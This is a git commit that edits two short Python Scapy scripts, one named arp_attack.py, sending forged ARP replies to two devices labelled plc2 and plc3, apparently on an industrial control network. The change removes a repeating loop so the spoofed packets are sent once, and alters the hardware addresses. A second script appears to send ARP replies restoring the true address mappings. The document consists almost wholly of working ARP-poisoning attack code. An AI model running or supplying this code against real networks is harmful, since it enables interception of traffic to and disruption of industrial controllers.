ce88974b0a3d221321fffbbc74dfeea8f07f42d4
ndtung220103 <nguyendinhtung103664@gmail.com>
2025-06-05 22:48:02 +0700

    fix

--- arp_attack.py
+++ arp_attack.py
@@ -1,22 +1,17 @@
 
 from scapy.all import *
-import time
 
-while True:
-    E = Ether(dst = '00:1D:9C:C8:BC:46', src = 'AA:AA:AA:AA:AA:AA')  
-    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:46', pdst = '192.168.1.20')  
+E = Ether(dst = '00:1D:9C:C8:BC:20', src = 'AA:AA:AA:AA:AA:AA')  
+A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:20', pdst = '192.168.1.20')  
     
-    print(f"send a packet to plc2")
-    pkt = E/A  
-    sendp(pkt)
+print(f"send a packet to plc2")
+pkt = E/A  
+sendp(pkt)
 
     
-    E1 = Ether(dst = '00:1D:9C:C8:BD:F2', src = 'AA:AA:AA:AA:AA:AA')  
-    A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C8:BD:F2', pdst = '192.168.1.30')  
+E1 = Ether(dst = '00:1D:9C:C8:BD:30', src = 'AA:AA:AA:AA:AA:AA')  
+A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C8:BD:30', pdst = '192.168.1.30')  
     
-    pkt1 = E1/A1 
-    print(f"send a packet to plc3")
-    sendp(pkt1)
-    
-
-    time.sleep(5)
+pkt1 = E1/A1 
+print(f"send a packet to plc3")
+sendp(pkt1)
--- send_arp.py
+++ send_arp.py
@@ -1,12 +1,12 @@
 from scapy.all import *
 
-E = Ether(dst = '00:1D:9C:C8:BC:46', src = '00:1D:9C:C8:BD:F2')  
-A = ARP(op = 2, hwsrc = '00:1D:9C:C8:BD:F2', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:46', pdst = '192.168.1.20')  
+E = Ether(dst = '00:1D:9C:C8:BC:20', src = '00:1D:9C:C8:BD:30')  
+A = ARP(op = 2, hwsrc = '00:1D:9C:C8:BD:30', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:20', pdst = '192.168.1.20')  
 pkt = E/A  
 sendp(pkt)
 
-E1 = Ether(dst = '00:1D:9C:C8:BD:F2', src = '00:1D:9C:C8:BC:46')  
-A1 = ARP(op = 2, hwsrc = '00:1D:9C:C8:BC:46', psrc = '192.168.1.20', hwdst = '00:1D:9C:C8:BD:F2', pdst = '192.168.1.30')  
+E1 = Ether(dst = '00:1D:9C:C8:BD:20', src = '00:1D:9C:C8:BC:20')  
+A1 = ARP(op = 2, hwsrc = '00:1D:9C:C8:BC:20', psrc = '192.168.1.20', hwdst = '00:1D:9C:C8:BD:30', pdst = '192.168.1.30')  
 pkt1 = E1/A1 
 sendp(pkt1)
     
